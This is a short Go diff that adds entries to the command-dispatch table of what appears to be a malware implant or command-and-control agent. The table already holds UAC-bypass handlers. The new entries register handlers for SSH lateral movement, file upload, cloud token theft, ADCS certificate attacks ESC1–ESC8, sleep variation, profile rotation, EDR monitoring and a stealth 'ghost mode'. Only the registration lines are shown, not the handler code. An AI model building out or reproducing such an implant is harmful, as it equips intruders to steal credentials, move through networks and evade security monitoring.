@@ -128,5 +128,39 @@ func init() {
 		"slui":                      handleSluiUAC,
 		"eventvwr":                  handleEventvwrUAC,
 		"computerdefaults":          handleComputerDefaultsUAC,
+
+		// SSH Lateral Movement
+		"ssh_lateral":               handleSSHLateral,
+		"ssh_keygen":                handleSSHKeygen,
+		"ssh_tunnel":                handleSSHTunnel,
+		"scp_upload":                handleSCPUpload,
+
+		// Cloud Token Theft
+		"cloud_steal":               handleCloudTokenTheft,
+
+		// ADCS Attack Suite (ESC1-8)
+		"adcs_esc1":                 handleADCSESC1,
+		"adcs_esc2":                 handleADCSESC2,
+		"adcs_esc3":                 handleADCSESC3,
+		"adcs_esc4":                 handleADCSESC4,
+		"adcs_esc5":                 handleADCSESC5,
+		"adcs_esc6":                 handleADCSESC6,
+		"adcs_esc7":                 handleADCSESC7,
+		"adcs_esc8":                 handleADCSESC8,
+		"adcs_full_audit":           handleADCSFullAudit,
+
+		// Sleep Variator
+		"set_sleep_mode":            handleSetSleepMode,
+		"get_sleep_mode":            handleGetSleepMode,
+
+		// Profile Rotation
+		"profile_rotate":            handleProfileRotate,
+
+		// EDR Monitor
+		"edr_status":                handleEdrStatus,
+
+		// Ghost Protocol
+		"ghost_mode_status":         handleGhostModeStatus,
+		"ghost_mode_exit":           handleGhostModeExit,
 	}
 }
